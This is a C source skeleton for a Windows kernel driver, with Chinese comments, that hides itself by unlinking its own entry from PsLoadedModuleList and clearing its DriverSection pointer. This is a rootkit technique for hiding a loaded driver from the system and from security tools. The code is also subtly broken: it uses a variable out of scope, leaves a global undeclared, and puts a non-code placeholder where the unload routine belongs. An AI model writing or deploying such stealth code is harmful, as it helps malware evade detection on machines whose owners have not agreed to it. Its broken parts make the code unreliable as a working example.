```c
// hide.c — WDM 驱动，模块隐藏骨架
#include <ntifs.h>

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID      ExceptionTable;
    ULONG      ExceptionTableSize;
    PVOID      GpValue;
    PVOID      NonPagedDebugInfo;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

static VOID HideSelfFromPsLoadedModuleList(VOID)
{
    PKLDR_DATA_TABLE_ENTRY entry =
        (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    // 摘链：让自己从 PsLoadedModuleList 双向链表里消失
    PLIST_ENTRY prev = entry->InLoadOrderLinks.Blink;
    PLIST_ENTRY next = entry->InLoadOrderLinks.Flink;
    if (prev && next) {
        prev->Flink = next;
        next->Blink = prev;
    }
    // 自环，防止再次遍历时崩
    entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
    entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;

    // 清 DriverObject 上的 DriverSection 指针，断掉反查入口
    DriverObject->DriverSection = NULL;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    // 先保存到全局，再摘链，避免摘完 DriverObject->DriverSection 拿不到
    g_pDriverObject = DriverObject;

    HideSelfFromPsLoadedModuleList();

    DriverObject->DriverUnload = [卸载时恢复链表即可];
    return STATUS_SUCCESS;
}
```

